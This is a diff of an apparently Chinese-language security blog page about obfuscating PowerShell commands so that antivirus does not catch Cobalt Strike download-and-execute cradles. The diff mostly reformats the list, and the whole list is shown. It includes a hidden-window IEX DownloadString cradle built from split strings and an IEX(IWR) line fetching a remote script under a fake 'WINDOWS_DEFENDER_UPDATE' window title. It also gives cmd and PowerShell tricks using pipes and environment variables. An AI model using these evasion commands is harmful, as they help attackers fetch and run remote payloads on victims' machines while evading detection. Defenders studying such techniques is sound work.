@@ -170,7 +170,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2022-08-16 09:35:22 / Modified: 22:14:49" itemprop="dateCreated datePublished" datetime="2022-08-16T09:35:22+08:00">2022-08-16</time>
+              <time title="Created: 2022-08-16 09:35:22 / Modified: 22:16:41" itemprop="dateCreated datePublished" datetime="2022-08-16T09:35:22+08:00">2022-08-16</time>
             </span>
 
           
@@ -231,9 +231,23 @@
 
 <p>我们再放到virustotal上面试试<br><img src="https://s2.loli.net/2022/08/16/Eqp7YMwD8feWuVl.png"><br>28/60，也就多绕过了4个防火墙<br>还是太菜了，手动的话，大概就这样了，下面贴一下在执行远程执行脚本时代码混淆，直接执行cs生成的语句杀软拦截的混淆操作</p>
 <ol>
-<li>使用Replace替换关键字部分字母，加上通过拆分后重新组合<br><code>powershell.exe -nop -w hidden -c &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://0.0.0.0:4545/text.txt&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</code></li>
-<li>使用powershell语言的特性来混淆代码<br><code>cmd.exe /c &quot;powershell -c Write-Host SUCCESS -Fore Green&quot;</code><br><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell -&quot;</code><br><code>cmd /c &quot;set p1=power&amp;&amp; set p2=shell&amp;&amp; cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -&quot;</code><br>管道输入流：<br><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell IEX $input&quot;</code><br>利用环境变量：<br><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</code><br><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -</code><br><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ([Environment]::GetEnvironmentVariable(&#39;cmd&#39;, &#39;Process&#39;))</code><br><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)</code><br>从其他进程获取参数：<br><code>cmd /c &quot;title WINDOWS_DEFENDER_UPDATE&amp;&amp;echo IEX (IWR https://7ell.me/power)&amp;&amp; FOR /L %i IN (1,1,1000) DO echo&quot;</code></li>
+<li><p>使用Replace替换关键字部分字母，加上通过拆分后重新组合<br><code>powershell.exe -nop -w hidden -c &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://0.0.0.0:4545/text.txt&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</code></p>
+</li>
+<li><p>使用powershell语言的特性来混淆代码</p>
+</li>
 </ol>
+<p><code>cmd.exe /c &quot;powershell -c Write-Host SUCCESS -Fore Green&quot;</code></p>
+<p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell -&quot;</code></p>
+<p><code>cmd /c &quot;set p1=power&amp;&amp; set p2=shell&amp;&amp; cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -&quot;</code></p>
+<p>管道输入流：</p>
+<p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell IEX $input&quot;</code></p>
+<p>利用环境变量：</p>
+<p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</code></p>
+<p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -</code></p>
+<p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ([Environment]::GetEnvironmentVariable(&#39;cmd&#39;, &#39;Process&#39;))</code></p>
+<p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)</code></p>
+<p>从其他进程获取参数：</p>
+<p><code>cmd /c &quot;title WINDOWS_DEFENDER_UPDATE&amp;&amp;echo IEX (IWR https://7ell.me/power)&amp;&amp; FOR /L %i IN (1,1,1000) DO echo&quot;</code></p>
 <hr>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TtKEnmUbtVMSqBCgrSj2Qw">参考文章</a></p>
 
